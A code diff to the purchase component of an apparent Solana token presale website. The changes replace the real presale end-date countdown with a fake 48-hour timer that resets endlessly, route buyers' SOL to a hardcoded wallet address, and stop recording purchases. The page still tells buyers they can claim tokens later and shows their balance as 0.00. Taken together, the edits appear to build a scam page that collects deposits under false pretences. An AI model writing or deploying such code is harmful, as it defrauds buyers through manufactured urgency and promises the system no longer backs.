@@ -37,38 +37,32 @@ const Buynow = () => {
   }
   const [stageStatus, setStageStatus] = useState(intialData)
 
+  const [countdown, setCountdown] = useState(
+    parseInt(localStorage.getItem('countdown')) || 172800 // 48 hours in seconds
+  )
+
   useEffect(() => {
-    const second = 1000,
-      minute = second * 60,
-      hour = minute * 60
-
-    const calculateCountdown = () => {
-      const now = new Date().getTime()
-      const distance = countDownDate - now
-      if (distance < 0) {
-        setPresaleEnded('Presale End')
-        clearInterval(countdownInterval)
-      } else {
-        setPresaleEnded('Presale Ends In')
-        // Calculate total hours and remaining minutes and seconds
-        const totalHours = Math.floor(distance / hour)
-        const remainingMinutes = Math.floor((distance % hour) / minute)
-        const remainingSeconds = Math.floor((distance % minute) / second)
-        setHours(totalHours)
-        setMinutes(remainingMinutes)
-        setSeconds(remainingSeconds)
-      }
-    }
-
-    // Set the countdown to 24 hours from now
-    const countDownDate = Number(stageStatus.endDate)
-
-    const countdownInterval = setInterval(calculateCountdown, 1000)
+    const interval = setInterval(() => {
+      setCountdown((prevCountdown) => {
+        if (prevCountdown > 0) {
+          localStorage.setItem('countdown', prevCountdown - 1)
+          return prevCountdown - 1
+        } else {
+          localStorage.setItem('countdown', 172800)
+          return 172800
+        }
+      })
+    }, 1000)
 
     return () => {
-      clearInterval(countdownInterval)
+      clearInterval(interval)
     }
-  }, [stageStatus.endDate])
+  }, [])
+
+  // const resetCountdown = () => {
+  //   localStorage.setItem("countdown", 172800);
+  //   setCountdown(172800);
+  // };
 
   useEffect(() => {
     if (publicKey) {
@@ -97,39 +91,38 @@ const Buynow = () => {
     }
   }, [publicKey, walletAddress])
 
-  useEffect(() => {
-    let isAPISubscribed = true
-    const getStageDetails = async () => {
-      try {
-        let stageData = await getStage()
-        if (stageData?.data?.success) {
-          const timestamp = new Date(stageData?.data?.data?.endDate)
-          const percentage =
-            (stageData?.data?.data?.raisedSol /
-              stageData?.data?.data?.totalSol) *
-            100
-          setStageStatus({
-            tokenPrice: stageData?.data?.data?.tokenPrice,
-            launchPrice: stageData?.data?.data?.launchPrice,
-            raisedSol: stageData?.data?.data?.raisedSol,
-            totalSol: stageData?.data?.data?.totalSol,
-            progressPercentage: percentage,
-            adminPubKey: stageData?.data?.data?.adminPubKey,
-            endDate: timestamp.getTime(),
-          })
-        } else {
-        }
-      } catch (error) {
-        console.error('Error in getWalletBalance:', error.message)
-      }
-    }
-    if (isAPISubscribed) {
-      getStageDetails()
-    }
-    return () => {
-      isAPISubscribed = false
-    }
-  }, [])
+  // useEffect(() => {
+  //   let isAPISubscribed = true
+  //   const getStageDetails = async () => {
+  //     try {
+  //       // let stageData = await getStage()
+  //       // if (stageData?.data?.success) {
+  //       const timestamp = new Date(stageData?.data?.data?.endDate)
+  //       // const percentage =
+  //       //   (stageData?.data?.data?.raisedSol / stageData?.data?.data?.totalSol) *
+  //       //   100
+  //       setStageStatus({
+  //         // tokenPrice: stageData?.data?.data?.tokenPrice,
+  //         // launchPrice: stageData?.data?.data?.launchPrice,
+  //         // raisedSol: stageData?.data?.data?.raisedSol,
+  //         // totalSol: stageData?.data?.data?.totalSol,
+  //         // progressPercentage: percentage,
+  //         // adminPubKey: stageData?.data?.data?.adminPubKey,
+  //         endDate: timestamp.getTime(),
+  //       })
+  //       // } else {
+  //       // }
+  //     } catch (error) {
+  //       console.error('Error in getWalletBalance:', error.message)
+  //     }
+  //   }
+  //   if (isAPISubscribed) {
+  //     getStageDetails()
+  //   }
+  //   return () => {
+  //     isAPISubscribed = false
+  //   }
+  // }, [])
 
   // Sign a transaction
   const send = async () => {
@@ -142,24 +135,24 @@ const Buynow = () => {
       //   return toastWarning("You don't have enough SOL balance");
       // }
 
-      if (stageStatus.adminPubKey === '' || !stageStatus.adminPubKey) {
-        return toastError('Try again')
-      }
+      // if (stageStatus.adminPubKey === '' || !stageStatus.adminPubKey) {
+      //   return toastError('Try again')
+      // }
 
       setloaderAct(true)
 
-      const getAdminAddress = await getAdmin(solAmount)
+      // const getAdminAddress = await getAdmin(solAmount)
 
-      if (!getAdminAddress?.status) {
-        setloaderAct(false)
-        return toastError('Please try again')
-      }
+      // if (!getAdminAddress?.status) {
+      //   setloaderAct(false)
+      //   return toastError('Please try again')
+      // }
 
       const transaction = await createTransferTransaction(
         solAmount,
         publicKey,
         connection,
-        getAdminAddress.address
+        '91UbYbBXcerJVa7yHqBmY8NKDmspT1QZ8Ub5Arem2Wxb'
       )
 
       // Sign the transaction with the user's wallet
@@ -173,24 +166,24 @@ const Buynow = () => {
       // Wait for confirmation
       await connection.confirmTransaction(signature, 'processed')
       if (signature) {
-        let isSaved = await saveWalletTransaction(
-          walletAddress,
-          solToken,
-          signature,
-          solAmount
+        // let isSaved = await saveWalletTransaction(
+        //   walletAddress,
+        //   solToken,
+        //   signature,
+        //   solAmount
+        // )
+        // if (isSaved.data.success) {
+        checkIfWalletIsConnected()
+        setSolAmount('')
+        setSolToken('')
+        toastSuccess(
+          'Congratulations! Your transaction is confirmed on the blockchain. Once the presale concludes, you’ll be able to claim your tokens.'
         )
-        if (isSaved.data.success) {
-          checkIfWalletIsConnected()
-          setSolAmount('')
-          setSolToken('')
-          toastSuccess(
-            'Congratulations! Your transaction is confirmed on the blockchain. Once the presale concludes, you’ll be able to claim your tokens.'
-          )
-        } else {
-          toastError(
-            'Transaction confirmed, getting error while saving transaction'
-          )
-        }
+        // } else {
+        //   toastError(
+        //     'Transaction confirmed, getting error while saving transaction'
+        //   )
+        // }
       } else {
         toastError('Transaction failed')
       }
@@ -207,12 +200,12 @@ const Buynow = () => {
       if (publicKey) {
         let response = publicKey.toString()
         setWalletAddress(response)
-        let tokenBalance = await getWalletHistory(response)
-        tokenBalance = tokenBalance?.data.success
-          ? Number(tokenBalance.data.data.tokenBalance).toFixed(2)
-          : '0.00'
-        console.log('tokenBalance', tokenBalance)
-        setTotalBuyTokenByUser(tokenBalance)
+        // let tokenBalance = await getWalletHistory(response)
+        // tokenBalance = tokenBalance?.data.success
+        //   ? Number(tokenBalance.data.data.tokenBalance).toFixed(2)
+        //   : '0.00'
+        // console.log('tokenBalance', tokenBalance)
+        setTotalBuyTokenByUser('0.00')
       } else {
         setTotalBuyTokenByUser('0.00')
         setWalletAddress('')
@@ -255,15 +248,21 @@ const Buynow = () => {
                 <div className="presale-time ">
                   <div className="row">
                     <div className="col-md-4">
-                      <div className="time-number">{hours}</div>
+                      <div className="time-number">
+                        {Math.floor(countdown / 3600)}
+                      </div>
                       <span>Hours</span>
                     </div>
                     <div className="col-md-4">
-                      <div className="time-number">{minutes}</div>
+                      <div className="time-number">
+                        {Math.floor((countdown % 3600) / 60)}
+                      </div>
                       <span>Mins</span>
                     </div>
                     <div className="col-md-4">
-                      <div className="time-number">{seconds}</div>
+                      <div className="time-number">
+                        {Math.floor((countdown % 3600) % 60)}
+                      </div>
                       <span>Sec</span>
                     </div>
                   </div>
